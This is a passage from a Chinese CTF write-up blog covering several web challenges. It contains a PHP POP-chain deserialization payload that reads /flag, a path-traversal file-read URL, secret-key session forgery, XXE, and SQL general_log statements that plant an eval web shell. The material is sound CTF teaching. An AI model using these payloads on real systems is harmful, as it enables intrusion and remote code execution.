punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">night</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$night</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">night</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'哒咩哟'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">day</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$day</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token function\">go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">light</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$light</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">-></span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dark</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dark</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       \n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token function\">hacked</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">hacked</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'呆jio步'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\.\\.*/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">ENT_QUOTES</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'UTF-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token variable\">$pop</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">night</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">night</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">day</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dark</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">light</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">day</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dark</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=file:///flag\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop1</span> <span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pop</span><span class=\"token punctuation\">,</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pop1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>生成的payload为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">‮⁦快给我传参⁩⁦pop<span class=\"token operator\">=</span>a<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"night\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"night\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"day\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"day\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"dark\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"dark\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"light\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"light\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"day\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"day\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"dark\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"dark\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">61</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=file:///flag\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token constant\">N</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里需要将最后的<code>i:1</code>改为<code>i:0</code>，不理解的可以看我这篇文章<a href=\"https://quan9i.top/post/%E6%B5%85%E6%9E%90%20PHP%20GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/\">https://quan9i.top/post/%E6%B5%85%E6%9E%90%20PHP%20GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</a></p>\n<p>而后传值即可</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306040129404.png\" alt=\"image-20230604012945350\"></p>\n<h1 id=\"安洵杯\"><a href=\"#安洵杯\" class=\"headerlink\" title=\"安洵杯\"></a>安洵杯</h1><h2 id=\"CarelessPy\"><a href=\"#CarelessPy\" class=\"headerlink\" title=\"CarelessPy\"></a>CarelessPy</h2><p>题目中含有注释</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306140148635.png\" alt=\"image-20230614014832594\"></p>\n<p>存在任意文件读取漏洞，在download处，但过滤了app.py、flag、proc等关键词<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306140148532.png\" alt=\"image-20230614014818477\"></p>\n<p>抓到的包JWTheader部分是islogin：<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306140147581.png\" alt=\"image-20230614014759526\"></p>\n<p>通过eval路由可以查看目录，这里能看到pyc文件<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306140147648.png\" alt=\"image-20230614014746578\"></p>\n<p>接下来用刚刚的任意文件读取读取文件，payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//47.108.165.60:42113/download</span>\n<span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span>app<span class=\"token operator\">/</span>__pycache__<span class=\"token operator\">/</span>part<span class=\"token operator\">.</span>cpython<span class=\"token operator\">-</span><span class=\"token number\">311.</span>pyc<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>而后进行pyc反编译</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306140147915.png\" alt=\"image-20230614014733865\"></p>\n<p>得到secret_key o2takuXX_donot_like_ntr 试试session伪造</p>\n<p>Session伪造成功，提示</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306140147118.png\" alt=\"image-20230614014721052\"></p>\n<p>访问对应URL</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306140147793.png\" alt=\"image-20230614014705728\"></p>\n<p>打一个xxe就行</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306140145864.png\" alt=\"image-20230614014507809\"></p>\n<h2 id=\"Confronting-robot\"><a href=\"#Confronting-robot\" class=\"headerlink\" title=\"Confronting robot\"></a>Confronting robot</h2><p>输入单引号</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306140149472.png\" alt=\"image-20230614014905170\"></p>\n<p>发现报错，明显SQL注入</p>\n<p>这里通过sqlmap可在name表得到如下信息</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">secret is in <span class=\"token operator\">/</span>sEcR@t_n@Bodyknow<span class=\"token operator\">.</span>php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>当时访问后发现扔是一个界面，疑似存在SQL注入，当时没有再进行深入。</p>\n<p>实际上，此时直接用慢日志查询写Shell即可实现Getshell，具体语句如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">show variables like 'general_log';\nset global general_log=on;\nset global general_log_file='/var/www/html/sEcR@t_n@Bodyknow.php';\nselect \"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n","feature":true,"text":"春秋杯Phpstudy之前并未复现这个漏洞，只知道是一个XSS导致的RCE，在比赛时没有思路，现进行复现。 搭建环境使用Windows，在官网https://www.xp.cn/windows-panel.html安装完小皮面板安装包后，拖入虚拟机进行安装即可 安装完后我们需要修...","link":"","photos":[],"count_time":{"symbolsCount":"6.9k","symbolsTime":"6 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"CTF","slug":"CTF","count":4,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%98%A5%E7%A7%8B%E6%9D%AF\"><span class=\"toc-text\">春秋杯</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Phpstudy\"><span class=\"toc-text\">Phpstudy</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#easypy\"><span class=\"toc-text\">easypy</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ezrust\"><span class=\"toc-text\">ezrust</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%99%95%E8%A5%BF%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%AF%94%E8%B5%9B\"><span class=\"toc-text\">第一届陕西大学生比赛</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ezpop\"><span class=\"toc-text\">ezpop</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%89%E6%B4%B5%E6%9D%AF\"><span class=\"toc-text\">安洵杯</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CarelessPy\"><span class=\"toc-text\">CarelessPy</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Confronting-robot\"><span class=\"toc-text\">Confronting robot</span></a></li></ol></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"JAVA常见漏洞复现","uid":"d33a4e6758c9cb9a2d0afd329ce9632a","slug":"常见JAVA漏洞复现","date":"2023-04-20T07:02:30.000Z","updated":"2023-09-03T13:22:20.000Z","comments":true,"path":"api/articles/常见JAVA漏洞复现.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032121885.png","text":"ShiroShiro 550漏洞原理Shiro550漏洞原理是Shiro框架提供了一种记住密码(Rememberme)的功能，用户登录成功后会生成经过加密的Cookie值，对Remembe的Cookie进行AES解密、Base64解密后再反序列化，就导致了反序列化RCE漏洞 。 ...","link":"","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":1,"path":"api/tags/漏洞复现.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Spring boot 从0到0.1 part(1)","uid":"ae530cf0e291102adbee6321d7a17ef6","slug":"Spring boot 从0到0.1","date":"2023-04-17T09:54:30.000Z","updated":"2023-04-26T19:05:30.000Z","comments":true,"path":"api/articles/Spring boot 从0到0.1.json","keywords":null,"cover":"https://images7.alphacoders.com/131/thumbbig-1310789.webp","text":"Day 01第一个Spring boot项目首先新建项目，选择Spring Initializr 随便填一下包名，选版本号后点击Next即可 开启Spring Web服务。 这里需要注意一点，去修改Spring boot版本，使其小于3.0.5(如果其他配置与我前面配置一致的话)...","link":"","photos":[],"count_time":{"symbolsCount":"42k","symbolsTime":"38 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"语言学习","slug":"语言学习","count":3,"path":"api/tags/语言学习.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}